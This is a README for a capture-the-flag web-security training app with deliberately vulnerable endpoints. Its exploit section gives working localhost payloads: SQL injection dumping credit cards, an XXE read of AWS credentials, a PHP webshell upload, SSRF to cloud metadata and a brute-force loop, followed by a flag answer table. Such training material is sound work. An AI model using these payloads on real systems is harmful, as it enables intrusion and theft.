# VulnForge

A hands-on, capture-the-flag style training platform for learning web vulnerabilities. Each challenge contains **real vulnerable code** running in a safe, isolated environment — no simulations, no abstractions.

## Vulnerabilities Covered (Easy → Expert)

| # | Vulnerability | Difficulty | Real Data Exposed |
|---|--------------|-----------|-------------------|
| 1 | Security Misconfiguration — Debug endpoint leaks .env | Easy | AWS keys, DB creds |
| 2 | Cryptographic Failures — Plaintext passwords in API | Easy | User credentials |
| 3 | Broken Access Control (IDOR) — No auth on user data | Easy | SSH private key |
| 4 | Identification & Authentication Failures — Brute force login | Medium | Admin password |
| 5 | SQL Injection — UNION injection in search | Medium | Credit card numbers |
| 6 | Insecure Design — No validation on transfer | Medium | Balance manipulation |
| 7 | Vulnerable & Outdated Components — XXE via XML parser | Hard | AWS secret key |
| 8 | Software & Data Integrity Failures — Arbitrary file upload | Hard | Webshell upload |
| 9 | Security Logging & Monitoring Failures — PII in logs | Hard | Credit cards in plaintext |
| 10 | Server-Side Request Forgery (SSRF) — Unvalidated fetch URL | Hard | EC2 instance metadata |
| 11 | **Expert Challenge: The Full Chain** — IDOR → Insecure Design → SSRF | **Expert** | Internal vault secret |

## Tech Stack

- **Frontend:** Next.js 14 (React)
- **Backend:** Express.js + SQLite (sql.js)
- **Auth:** JWT tokens

## Quick Start

```bash
# Install dependencies
npm run install:all

# Delete old DB for fresh realistic seed data
rm backend/owasp.db

# Start backend (port 3001) + frontend (port 3000)
npm run dev
```

Open http://localhost:3000 in your browser.

## Exploit Commands

Each challenge can be solved with real pentesting tools or direct curl:

```bash
# 1 — Security Misconfiguration
curl http://localhost:3001/api/debug | jq .env_vars

# 2 — Cryptographic Failures (same endpoint, plaintext passwords in users array)
curl http://localhost:3001/api/debug | jq '.users[] | {username, password}'

# 3 — IDOR — access admin's SSH private key
curl http://localhost:3001/api/user/1/notes | jq

# 4 — Auth Failures — brute force admin password
for pw in admin password 123456 admin123 P@ssw0rd\!2024; do
  curl -s -X POST http://localhost:3001/api/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":\"$pw\"}" | grep -q token && echo "Found: $pw"
done

# 5 — SQL Injection — dump credit cards
curl "http://localhost:3001/api/search?q=' UNION SELECT id,card_number,expiry,cvv FROM credit_cards --"
# Or use sqlmap:
# sqlmap -u 'http://localhost:3001/api/search?q=test' --batch --dump -T credit_cards

# 6 — Insecure Design — steal via negative amount
curl -X POST http://localhost:3001/api/transfer \
  -H 'Content-Type: application/json' \
  -d '{"fromAccount":"ACC-001","toAccount":"ACC-002","amount":-999999.99}'

# 7 — XXE — read AWS credentials
curl -X POST http://localhost:3001/api/parse \
  -H 'Content-Type: application/json' \
  -d '{"xml":"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///home/ubuntu/.aws/credentials\">]><data>&xxe;</data>"}'

# 8 — Integrity — upload webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST http://localhost:3001/api/upload -F "file=@shell.php"
# Access it: curl http://localhost:3001/uploads/shell.php?cmd=id

# 9 — Logging — find credit cards in plaintext
curl http://localhost:3001/api/logs | jq

# 10 — SSRF — access EC2 metadata service
curl "http://localhost:3001/api/fetch?url=http://169.254.169.254/latest/meta-data/instance-id"

# 11 — Expert Chain (3 steps)
# Step 1: IDOR for service key
curl http://localhost:3001/api/user/1/notes
# Step 2: Verify with key
curl -X POST http://localhost:3001/api/verify-service \
  -H 'Content-Type: application/json' \
  -d '{"key":"svc-key-expert-789"}'
# Step 3: SSRF to internal vault
curl "http://localhost:3001/api/fetch?url=http://localhost:3001/api/internal/vault"
```

## Challenge Endpoints

| Endpoint | Vulnerability | What leaks |
|----------|--------------|------------|
| `GET /api/debug` | Security Misconfiguration | `.env` vars: AWS keys, DB password, Redis URL |
| `GET /api/user/:id` | IDOR | Any user's profile + notes |
| `POST /api/login` | Auth Failure | Brute-forceable, no rate limit |
| `GET /api/search?q=` | SQL Injection | `credit_cards`, `secrets`, `users` tables |
| `POST /api/transfer` | Insecure Design | Negative amounts accepted |
| `POST /api/parse` | XXE | Read any server file |
| `POST /api/upload` | Integrity Failure | Arbitrary file write |
| `GET /api/logs` | Logging Failure | Plaintext passwords, CC numbers |
| `GET /api/fetch?url=` | SSRF | Internal services, cloud metadata |

## Flag Reference

| Challenge | Flag (what to submit) |
|-----------|----------------------|
| Security Misconfiguration | `AKIAIOSFODNN7EXAMPLE` |
| Cryptographic Failures | `alice:LetMeIn!2024` |
| Broken Access Control | `MHQCAQEEIIm3V+wYzIM6Trds4Rv5fGRpYq4nlcGmhqM3iDk9kWhLoAcGBSuBBAAi` |
| Authentication Failures | `P@ssw0rd!2024` |
| SQL Injection | `4532015112830366` |
| Insecure Design | `$999999.99` |
| Vulnerable Components | `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` |
| Integrity Failures | `<?php system($_GET["cmd"]); ?>` |
| Logging Failures | `4111111111111111` |
| SSRF | `ami-0c55b159cbfafe1f0` |
| Expert Chain | `VAULT_SECRET_a1b2c3d4e5` |

## Security Note

This platform is intentionally vulnerable for **educational purposes only**. Do not deploy it publicly or expose it to the internet. Run it only on your local machine for learning.
